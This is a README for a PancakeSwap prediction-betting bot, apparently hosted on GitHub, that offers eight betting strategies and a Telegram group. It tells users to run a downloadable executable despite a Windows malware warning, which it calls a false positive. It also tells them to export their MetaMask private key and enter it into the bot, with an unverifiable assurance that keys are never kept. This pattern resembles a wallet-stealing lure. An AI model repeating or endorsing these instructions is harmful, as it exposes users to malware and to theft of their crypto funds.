<p align="justify">

 # PancakeSwap Prediction MULTI STRATEGY Bot 



## Prediction v0.2 
  ![gitico](https://user-images.githubusercontent.com/85583249/155407175-7fa0e06f-7679-4918-b6e6-ad079b75019a.png)
![image](https://img.shields.io/github/issues/drignads/PCS-PREDICTION-MULTI_STRATEGY-BOT)
![image](https://img.shields.io/github/forks/drignads/PCS-PREDICTION-MULTI_STRATEGY-BOT)
![image](https://img.shields.io/github/stars/drignads/PCS-PREDICTION-MULTI_STRATEGY-BOT)
![image](https://img.shields.io/github/license/drignads/PCS-PREDICTION-MULTI_STRATEGY-BOT)
![image](https://img.shields.io/badge/python-3.8.10-brightgreen)
### [Join telegram](https://t.me/prediction_multi_strategy)
  
![image](https://user-images.githubusercontent.com/85583249/155422019-0f044c3f-8837-4279-9e5d-089bb3c9ad8c.png)

## Windows Installation

[Download](https://github.com/drignads/PCS-PREDICTION-MULTI_STRATEGY-BOT/releases/download/0.2.0/MultiStrategy.exe) the executable file and open it.

*Choose yes when/if asked to install chromedriver. 
**Windows may throw a malware warning, this is a false positive, we are working on that. 

## Running from source (linux/windows/other OS's)

Watch tutorial: https://www.youtube.com/watch?v=kbHkeusFRIo&t=5s

Clone or Download this repository, turn on your venv active and install the requirements with:

```pip install -r requirements.txt```

Run with

```python MultiStrategy.py``` 

## Account

Add your account address and private key to initiate. Or leave it blank and press enter for simulation mode.

![image](https://user-images.githubusercontent.com/85583249/155382562-8ad94765-854f-423c-81e7-213b980577de.png)

You can find your private key on Metamask by going to Account Details > Export Private Key

*Your keys are safe, they are not saved or kept anywhere apart from your machine's temporary virtual environment while running the bot. Being destroyed when you close it.

## Strategies
![image](https://user-images.githubusercontent.com/85583249/155391390-76946fe3-2ff2-481d-98aa-e7677ae39ff4.png)


You get 8 different strategies to choose:

#### Auto Trend

- Use MA indicator analysis to find a BEAR or BULL position, betting every round.

#### Up Trend

- Use MA indicator analysis to find a BULL position, only.

#### Down Trend

- Use MA indicator analysis to find a BEAR position, only.

#### Higher Payouts (against the pool)

- Bets every round in the position side with the higher payout (best Game Theory oriented solution)

#### Lower Payout (with the pool)

- Bets every round in the position side with the lower payout (best when the market is experience a clear pump or dump)

#### Manual

- You are in control. A much more pratical approach for manual play then using pcs frontend

#### Random

- Tilted? For fun? Try going random on every round! Giving enough rounds you'll find a win ratio of around 50%

#### Copy Player

- Using copy player strategy you can follow and copy the positions of any other player...[Find the winners](https://pancakeswap.finance/prediction/leaderboard) and just do what they do. *if they bet too late you may get a failed tx
![image](https://user-images.githubusercontent.com/85583249/155389016-7ff263de-9cf0-4477-8417-948c5cb1ec65.png)


## Disclaimer 
[DrigNads](https://twitter.com/NadsDrig) aka Cabe Lo. Known member of the pcs community:

I strong recomend that you follow all the security instructions stated in this file and use only this github repository as source! I can not guarantee the security of other forks/sources.

I can not guarantee that you will loose or make money. Please, do your risk manegement properly.

*This bot takes a tax comission of 2% over profits (only). The goal here is to be profitable to it's users by improving our strategies and user experience constantly. Join our telegram group for cash-backs and NFT giveaways. Please do not use it if you don't agree with the tax and goals, the repository is free @ MIT-license and one can create your own version.

See [Roadmap]() for future improvements and [Contribution]() for collabs.

Don't forget to [Join telegram](https://t.me/prediction_multi_strategy) :)

Good Luck!

</p>
